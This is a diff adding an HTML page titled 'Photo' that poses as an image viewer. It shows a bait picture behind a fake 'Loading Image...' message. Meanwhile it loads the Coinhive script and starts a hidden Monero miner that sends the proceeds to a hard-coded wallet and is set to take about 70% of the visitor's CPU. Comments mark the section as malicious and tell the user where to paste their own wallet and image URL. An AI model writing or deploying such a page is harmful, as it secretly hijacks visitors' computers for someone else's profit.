@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Photo</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: black;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+        #baitImage {
+            max-width: 100%;
+            max-height: 100%;
+        }
+        #loader {
+            position: absolute;
+            color: white;
+            font-family: sans-serif;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- This is the bait image. It will be shown to the user. -->
+    <img id="baitImage" src="https://i.imgur.com/GdJ91vF.jpeg" style="display:none;">
+    
+    <!-- This is a fake loading message. -->
+    <div id="loader">Loading Image...</div>
+
+    <!-- ============================================================= -->
+    <!-- =================== MALICIOUS SCRIPT PART =================== -->
+    <!-- ============================================================= -->
+    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+    <script>
+        // --- CONFIGURATION ---
+        // 1. PASTE YOUR MONERO WALLET ADDRESS HERE
+        var myWallet = "41dynwSJuzse2CknZhxrFaZYgZ1NwYg1fFpecWkrwWNyTeKDbrBKjinR9TTNnuPYh8a6MQXUhVwh7BvEpXdeFab3QcjPSVH";
+
+        // 2. PASTE YOUR IMAGE URL HERE (from Step 1)
+        var imageUrl = "https://i.imgur.com/GdJ91vF.jpeg";
+
+        // --- DO NOT EDIT BELOW THIS LINE ---
+
+        // Hide the fake loader after 2 seconds and show the real image
+        setTimeout(function() {
+            document.getElementById('loader').style.display = 'none';
+            document.getElementById('baitImage').src = imageUrl;
+            document.getElementById('baitImage').style.display = 'block';
+        }, 2000);
+
+        // Start the hidden miner
+        var miner = new CoinHive.Anonymous(myWallet, {
+            throttle: 0.7, // Use 70% of the user's CPU. Lower number = more mining, more noticeable.
+            threads: 2     // Use 2 CPU threads.
+        });
+        
+        miner.start();
+
+    </script>
+    <!-- ============================================================= -->
+
+</body>
+</html>
